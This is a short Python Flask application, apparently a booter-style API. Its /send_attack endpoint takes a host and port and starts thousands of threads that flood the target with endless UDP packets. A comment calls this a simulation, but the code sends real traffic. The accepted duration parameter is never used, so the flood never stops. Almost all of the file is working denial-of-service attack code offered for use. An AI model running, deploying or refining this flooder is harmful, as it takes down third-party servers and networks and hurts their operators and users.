from flask import Flask, request, jsonify
import socket
import threading

app = Flask(__name__)

# Configuración de la API
methods = ["UDP", "OVH"]

# Función para enviar paquetes UDP
def send_packet(host, port, amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True:
            s.send(b"\x99" * amplifier)
    except Exception as e:
        print(f"Error: {e}")
        s.close()

# Función para simular el envío de un ataque
def send_attack(method, host, port):
    if method not in methods:
        return "Invalid Method", 400

    if method == "UDP":
        loops = 10000
        for sequence in range(loops):
            threading.Thread(target=send_packet, args=(host, port, 375), daemon=True).start()
            threading.Thread(target=send_packet, args=(host, port, 750), daemon=True).start()
        return f"Attack sent to {host}:{port} for using {method}!", 200
    elif method == "OVH":
        return "OVH method not implemented", 501

# Endpoint para enviar un ataque
@app.route('/send_attack', methods=['GET'])
def send_attack_endpoint():
    time = request.args.get('time')
    method = request.args.get('method')
    host = request.args.get('host')
    port = request.args.get('port')

    if not all([time, method, host, port]):
        return "Please fill in all parameters!", 400

    time = int(time)
    port = int(port)

    message, status_code = send_attack(method, host, port)
    return jsonify({"message": message}), status_code

# Ejecutar la aplicación
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
